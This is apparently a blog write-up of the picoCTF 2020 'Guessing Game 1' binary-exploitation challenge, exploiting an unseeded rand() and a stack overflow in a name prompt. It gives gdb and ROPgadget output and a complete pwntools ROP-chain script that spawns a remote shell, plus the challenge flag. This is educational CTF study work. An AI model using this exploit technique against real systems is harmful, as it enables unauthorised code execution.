---
layout: post
title: "Guessing game 1 - picoCTF 2020"
author: gameplayone23
tags:
- 2020
- rev
- pwntools
- rop
- gdb
---

# Guessing Game 1

- Category: Binary exploitation
- Points : 250

*"I made a simple game to show off my programming skills. See if you can beat it! "*

- [Vuln](https://jupiter.challenges.picoctf.org/static/759df904e72b80ca3155ee081f3cb189/vuln)
- [Vuln.c](https://jupiter.challenges.picoctf.org/static/759df904e72b80ca3155ee081f3cb189/vuln.c)
- [Makefile](https://jupiter.challenges.picoctf.org/static/759df904e72b80ca3155ee081f3cb189/Makefile)

*nc jupiter.challenges.picoctf.org 38467*

Hints :

- Tools can be helpful, but you may need to look around for yourself.
- Remember, in CTF problems, if something seems weird it probably means something...

# Description

This game ask you to find a number, if you get it, you can enter your winner name !

# Binary

First let's find what kind of file is the binary:

```console
> file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4
f60, not stripped
```

And security :

```console
> checksec --file=vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# Random not so random

The number to find is random but we can observe in the `get_random` function that no seed (srand function) is provided :

```c
long get_random(void)
{
  int iVar1; 
  iVar1 = rand();
  return (long)(iVar1 % 100);
}
```

So every execution we'll get the samed sequence.

We can find the first number using `gdb` with a pointer to the return of this function :

```console
gdb-peda$ b *0x0000000000400b99
Breakpoint 1 at 0x400b99
gdb-peda$ run
[----------------------------------registers-----------------------------------]
RAX: 0x53 ('S')
...
gdb-peda$ p/d 0x53
$1 = 83
```

In the RAX register, we can find the number to guess, note that we have to increment by 1 because of the `do_stuff` function :

(We `Ghidra` to disassemble the binary)

```c
ulong do_stuff(void)

{
  char local_88 [104];
  long local_20;
  long local_18;
  uint local_c;
  
  local_18 = get_random();
  local_18 = increment(local_18);
...
}
```

The first number to guess is `84`

# BUFFER OVERFLOW

Then we have to enter our name.

It's a classic, we can find a buffer overflow in the `win` function :

```c
void win() {
    // BUFSIZE os 100
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
    // 360 characters into variable sized with 100 -> OVERFLOW opportunity
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}
```

We can search the overflow offset with `gdb` creating a pattern :

```console
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwA'
```

And search this pattern:

```console
gdb-peda$ pattern search
Registers contain pattern buffer:
RBP+0 found at offset: 112
```

So the sweet spot is at `112`

# ROPGADGET

Because of the security, we have to use [ROP Return Oriented Programming](https://fr.wikipedia.org/wiki/Return-oriented_programming)

Using ROPgadget, we can list all the gadgets :

```console
> ROPgadget --binary vuln
....
0x000000000041af9a : xor eax, esi ; add al, 0x24 ; add ecx, ebp ; retf
0x000000000041f7bf : xor ecx, dword ptr [rbx + 0x8c64215] ; add bh, dh ; ret 0
0x000000000041ecc6 : xor ecx, dword ptr [rbx + 0x8d13b15] ; add bh, dh ; ret 0
0x000000000047b4ad : xor ecx, dword ptr [rcx - 0x7d] ; ret
0x0000000000406ba1 : xor ecx, ecx ; pop rbx ; pop rbp ; mov rax, r9 ; pop r12 ; ret
0x0000000000403044 : xor esp, esp ; pop rbx ; pop rbp ; mov rax, r12 ; pop r12 ; ret
0x000000000041bca1 : xor qword ptr [rax], r9 ; add dword ptr [rax + 0x39], ecx ; ret
0x00000000004085a8 : xor r8d, r8d ; mov rax, r8 ; pop rbx ; pop rbp ; ret
0x000000000040859d : xor r8d, r8d ; mov rax, r8 ; ret
0x000000000043c565 : xor rax, rax ; ret
....
```

# Solution

Now, the `Goal` is to create a payload in order to launch a `shell` :

Using ROPgadget, we'll use `syscall` to launch `execve` to get a shell :

```python
#!/usr/bin/env python
from pwn import *

p = remote('jupiter.challenges.picoctf.org',38467)

# Set the architecture
context.arch='amd64'
# Set a terminal for gdb
context.terminal = ["tmux", "splitw", "-h"]

# Our buffer overflow offset
offset = 120

# Our binary
# elf = ELF("./vuln")
# p = elf.process()

# rop = ROP(elf)
# gdb.attach(p,'b *0x400c8b')

# Functions to pack payload values
pack = make_packer('all', endian='big', sign='unsigned')
p64 = make_packer(64, endian='little', sign='unsigned')

payload = pack(0x90)*120            # 120 caracteres
payload += p64(0x4163f4)            # pop rax ; ret
payload += p64(59)                  # used by syscall to launch execve (59)
payload += p64(0x44a6b5)            # pop rdx ; ret
payload += pack(0x2F62696E2F736800) # /bin/sh\x00
payload += p64(0x400696)            # pop rdi ; ret
payload += p64(0x006b7000)          # free space for a pointer found using gdb vmmap
payload += p64(0x436393)            # mov qword ptr [rdi], rdx ; ret
payload += p64(0x44cc49)            # pop rdx ; pop rsi ; ret
payload += p64(0)                   # 0
payload += p64(0)                   # 0
payload += p64(0x40137c)            # syscall

# The number to guess prompt
p.sendlineafter("?\n", "84")
# Winner name prompt
p.recvuntil('\nName? ')
# Send the payload
p.sendline(payload)
# Interactive to move to get access to the shell
p.interactive()
```

Launching this script we can get the `flag` :

```console
> python3 ape5_solution.py
[+] Opening connection to jupiter.challenges.picoctf.org on port 38467: Done
[*] Switching to interactive mode
Congrats \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\
x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\xf4cA

$ ls
flag.txt
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_580891753d5e9212}
```

# CONCLUSION

I've spent hours on this one to find a solution and to understand every details. But a the end i've a better knowledge of asm.